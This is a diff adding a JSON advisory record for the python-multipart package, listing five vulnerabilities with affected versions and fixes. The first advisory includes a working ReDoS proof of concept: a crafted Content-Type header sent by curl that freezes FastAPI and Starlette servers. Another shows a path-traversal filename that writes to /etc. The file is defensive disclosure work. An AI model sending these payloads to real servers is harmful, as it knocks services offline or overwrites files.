@@ -1,0 +1,513 @@
+{
+  "schema_version": 1,
+  "package": "python-multipart",
+  "purls": [
+    "pkg:pypi/python-multipart"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 22,
+  "advisories": [
+    {
+      "id": "GHSA-2jv5-9r88-3w3p",
+      "primary_id": "CVE-2024-24762",
+      "aliases": [
+        "CVE-2024-24762",
+        "GHSA-qf9m-vfgh-m389",
+        "PYSEC-2024-38"
+      ],
+      "cve_ids": [
+        "CVE-2024-24762"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "python-multipart",
+      "summary": "python-multipart vulnerable to Content-Type Header ReDoS",
+      "details": "### Summary\n\nWhen using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.\n\nAn attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.\n\nThis can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\nThis only applies when the app uses form data, parsed with `python-multipart`.\n\n### Details\n\nA regular HTTP `Content-Type` header could look like:\n\n```\nContent-Type: text/html; charset=utf-8\n```\n\n`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\n\nA custom option could be made and sent to the server to break it with:\n\n```\nContent-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n```\n\n### PoC\n\nCreate a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:\n\n```Python\n# main.py\nfrom wsgiref.simple_server import make_server\nfrom wsgiref.validate import validator\n\nfrom multipart.multipart import parse_options_header\n\n\ndef simple_app(environ, start_response):\n    _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])\n\n    start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])\n    return [b\"Ok\"]\n\n\nhttpd = make_server(\"\", 8123, validator(simple_app))\nprint(\"Serving on port 8123...\")\nhttpd.serve_forever()\n```\n\nThen send the attacking request with:\n\n```console\n$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'\n```\n\n### Impact\n\nThis is a ReDoS, (Regular expression Denial of Service), so it only applies to those using python-multipart to read form data, such as Starlette and FastAPI.\n\n### Original Report\n\nThis was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r\n\n<details>\n<summary>Original report to FastAPI</summary>\n\nHey Tiangolo!\n\nMy name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).\n\nHere are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:\n\n```Python\nfrom typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n```\n\nI'm running the above with uvicorn with the following command:\n\n```console\nuvicorn server:app\n```\n\nThen run the following cUrl command:\n\n```\ncurl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n```\n\nYou'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%\n\nYou can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.\n\nIf you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.\n\nCheers\n\n#### Impact\n\nAn attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.\n\n#### Occurrences\n\n[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)\n\n</details>",
+      "published": "2024-02-12T17:28:12Z",
+      "modified": "2026-04-03T19:31:22.518502Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-24762"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/github/advisory-database/pull/4829"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Kludex/python-multipart"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/tiangolo/fastapi/releases/tag/0.109.1"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-2jv5-9r88-3w3p",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.7"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6"
+      ],
+      "affected_conda_versions": [
+        "0.0.5",
+        "0.0.6"
+      ]
+    },
+    {
+      "id": "GHSA-59g5-xgcq-4qw3",
+      "primary_id": "CVE-2024-53981",
+      "aliases": [
+        "CVE-2024-53981"
+      ],
+      "cve_ids": [
+        "CVE-2024-53981"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "python-multipart",
+      "summary": "Denial of service (DoS) via deformation `multipart/form-data` boundary",
+      "details": "### Summary\n\nWhen parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary. This happens one byte at a time and emits a log event each time, which may cause excessive logging for certain inputs.\n\nAn attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).\n\n### Impact\n\nApplications that use `python-multipart` to parse form data (or use frameworks that do so) are affected. \n\n### Original Report\n\nThis security issue was reported by:\n- GitHub security advisory in Starlette on October 30 by @Startr4ck\n- Email to `python-multipart` maintainer on October 3 by @mnqazi",
+      "published": "2024-12-02T21:37:04Z",
+      "modified": "2026-02-04T04:25:35.650432Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-59g5-xgcq-4qw3"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-53981"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/python-multipart/commit/c4fe4d3cebc08c660e57dd709af1ffa7059b3177"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Kludex/python-multipart"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-59g5-xgcq-4qw3",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.18"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.10",
+        "0.0.11",
+        "0.0.12",
+        "0.0.13",
+        "0.0.14",
+        "0.0.15",
+        "0.0.16",
+        "0.0.17",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.0.9"
+      ],
+      "affected_conda_versions": [
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.0.9",
+        "0.0.10",
+        "0.0.11",
+        "0.0.12",
+        "0.0.14",
+        "0.0.15",
+        "0.0.16",
+        "0.0.17"
+      ]
+    },
+    {
+      "id": "GHSA-mj87-hwqh-73pj",
+      "primary_id": "CVE-2026-40347",
+      "aliases": [
+        "CVE-2026-40347"
+      ],
+      "cve_ids": [
+        "CVE-2026-40347"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "python-multipart",
+      "summary": "python-multipart affected by Denial of Service via large multipart preamble or epilogue data",
+      "details": "### Summary\n\nA denial of service vulnerability exists when parsing crafted `multipart/form-data` requests with large preamble or epilogue sections.\n\n### Details\n\nTwo inefficient multipart parsing paths could be abused with attacker-controlled input.\n\nBefore the first multipart boundary, the parser handled leading CR and LF bytes inefficiently while searching for the start of the first part. After the closing boundary, the parser continued processing trailing epilogue data instead of discarding it immediately. As a result, parsing time could grow with the size of crafted data placed before the first boundary or after the closing boundary.\n\n### Impact\n\nAn attacker can send oversized malformed multipart bodies that consume excessive CPU time during request parsing, reducing request-handling capacity and delaying legitimate requests. This issue degrades availability but does not typically result in a complete denial of service for the entire application.\n\n### Mitigation\n\nUpgrade to version `0.0.26` or later, which skips ahead to the next boundary candidate when processing leading CR/LF data and immediately discards epilogue data after the closing boundary.",
+      "published": "2026-04-15T19:45:44Z",
+      "modified": "2026-05-05T16:08:52.939863Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-mj87-hwqh-73pj"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-40347"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Kludex/python-multipart"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/python-multipart/releases/tag/0.0.26"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-mj87-hwqh-73pj",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.26"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.10",
+        "0.0.11",
+        "0.0.12",
+        "0.0.13",
+        "0.0.14",
+        "0.0.15",
+        "0.0.16",
+        "0.0.17",
+        "0.0.18",
+        "0.0.19",
+        "0.0.2",
+        "0.0.20",
+        "0.0.21",
+        "0.0.22",
+        "0.0.23",
+        "0.0.24",
+        "0.0.25",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.0.9"
+      ],
+      "affected_conda_versions": [
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.0.9",
+        "0.0.10",
+        "0.0.11",
+        "0.0.12",
+        "0.0.14",
+        "0.0.15",
+        "0.0.16",
+        "0.0.17",
+        "0.0.18",
+        "0.0.19",
+        "0.0.20",
+        "0.0.21",
+        "0.0.22",
+        "0.0.24"
+      ]
+    },
+    {
+      "id": "GHSA-pp6c-gr5w-3c5g",
+      "primary_id": "CVE-2026-42561",
+      "aliases": [
+        "CVE-2026-42561"
+      ],
+      "cve_ids": [
+        "CVE-2026-42561"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "python-multipart",
+      "summary": "python-multipart has Denial of Service via unbounded multipart part headers",
+      "details": "### Summary\n\n`python-multipart` has a denial of service vulnerability in multipart part header parsing. When parsing `multipart/form-data`, `MultipartParser` previously had no limit on the number of part headers or the size of an individual part header. An attacker could send a request with either many repeated headers without terminating the header block or a single very large header value, causing excessive CPU work before request rejection or completion.\n\n### Impact\n\nApplications that parse attacker-controlled `multipart/form-data` with affected versions of `python-multipart` can experience CPU exhaustion. ASGI applications using Starlette, FastAPI, or other frameworks that invoke `python-multipart` may have worker or event-loop delays while processing malicious upload requests.\n\n### Details\n\nThe affected parser states are `HEADER_FIELD_START`, `HEADER_FIELD`, `HEADER_VALUE_START`, `HEADER_VALUE`, and `HEADER_VALUE_ALMOST_DONE`. The issue can be triggered by:\n\n- A multipart part with an oversized individual header value.\n- A multipart part with many repeated header lines or an unterminated header block.\n\nBoth variants are addressed by enforcing default parser limits for maximum header count and maximum header size.\n\n### Mitigation\n\nUpgrade to `python-multipart` `0.0.27` or later.\n\nIf upgrading is not immediately possible, reduce exposure by enforcing request body size limits at the server, proxy, or framework layer. This is only a mitigation; affected versions of `python-multipart` still parse multipart part headers without the default header count and header size limits.",
+      "published": "2026-05-06T21:56:14Z",
+      "modified": "2026-05-14T20:51:15.885660Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-pp6c-gr5w-3c5g"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42561"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Kludex/python-multipart"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-pp6c-gr5w-3c5g",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.27"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.10",
+        "0.0.11",
+        "0.0.12",
+        "0.0.13",
+        "0.0.14",
+        "0.0.15",
+        "0.0.16",
+        "0.0.17",
+        "0.0.18",
+        "0.0.19",
+        "0.0.2",
+        "0.0.20",
+        "0.0.21",
+        "0.0.22",
+        "0.0.23",
+        "0.0.24",
+        "0.0.25",
+        "0.0.26",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.0.9"
+      ],
+      "affected_conda_versions": [
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.0.9",
+        "0.0.10",
+        "0.0.11",
+        "0.0.12",
+        "0.0.14",
+        "0.0.15",
+        "0.0.16",
+        "0.0.17",
+        "0.0.18",
+        "0.0.19",
+        "0.0.20",
+        "0.0.21",
+        "0.0.22",
+        "0.0.24",
+        "0.0.26"
+      ]
+    },
+    {
+      "id": "GHSA-wp53-j4wj-2cfg",
+      "primary_id": "CVE-2026-24486",
+      "aliases": [
+        "CVE-2026-24486"
+      ],
+      "cve_ids": [
+        "CVE-2026-24486"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "python-multipart",
+      "summary": "Python-Multipart has Arbitrary File Write via Non-Default Configuration",
+      "details": "### Summary\n\nA Path Traversal vulnerability exists when using non-default configuration options `UPLOAD_DIR` and `UPLOAD_KEEP_FILENAME=True`. An attacker can write uploaded files to arbitrary locations on the filesystem by crafting a malicious filename.\n\n### Details\n\nWhen `UPLOAD_DIR` is set and `UPLOAD_KEEP_FILENAME` is `True`, the library constructs the file path using `os.path.join(file_dir, fname)`. Due to the behavior of `os.path.join()`, if the filename begins with a `/`, all preceding path components are discarded:\n\n```py\nos.path.join(\"/upload/dir\", \"/etc/malicious\") == \"/etc/malicious\"\n```\n                        \nThis allows an attacker to bypass the intended upload directory and write files to arbitrary paths.                                         \n                                                                                                                                              \n#### Affected Configuration                                                                                                                      \n                                                                                                                                              \nProjects are only affected if all of the following are true:                                                                                     \n- `UPLOAD_DIR` is set\n- `UPLOAD_KEEP_FILENAME` is set to True\n- The uploaded file exceeds `MAX_MEMORY_FILE_SIZE` (triggering a flush to disk)\n\nThe default configuration is not vulnerable.                                                                                                \n                                                                                                                                              \n#### Impact                                                                                                                                   \n                                                                                                                                              \nArbitrary file write to attacker-controlled paths on the filesystem.                                                                        \n                                                                                                                                              \n#### Mitigation                                                                                                                                  \n                                                                                                                                              \nUpgrade to version 0.0.22, or avoid using `UPLOAD_KEEP_FILENAME=True` in project configurations.",
+      "published": "2026-01-26T23:28:05Z",
+      "modified": "2026-02-04T03:14:41.466242Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/python-multipart/security/advisories/GHSA-wp53-j4wj-2cfg"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24486"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/python-multipart/commit/9433f4bbc9652bdde82bbe380984e32f8cfc89c4"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Kludex/python-multipart"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Kludex/python-multipart/releases/tag/0.0.22"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-wp53-j4wj-2cfg",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.22"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.10",
+        "0.0.11",
+        "0.0.12",
+        "0.0.13",
+        "0.0.14",
+        "0.0.15",
+        "0.0.16",
+        "0.0.17",
+        "0.0.18",
+        "0.0.19",
+        "0.0.2",
+        "0.0.20",
+        "0.0.21",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.0.9"
+      ],
+      "affected_conda_versions": [
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.0.9",
+        "0.0.10",
+        "0.0.11",
+        "0.0.12",
+        "0.0.14",
+        "0.0.15",
+        "0.0.16",
+        "0.0.17",
+        "0.0.18",
+        "0.0.19",
+        "0.0.20",
+        "0.0.21"
+      ]
+    }
+  ]
+}
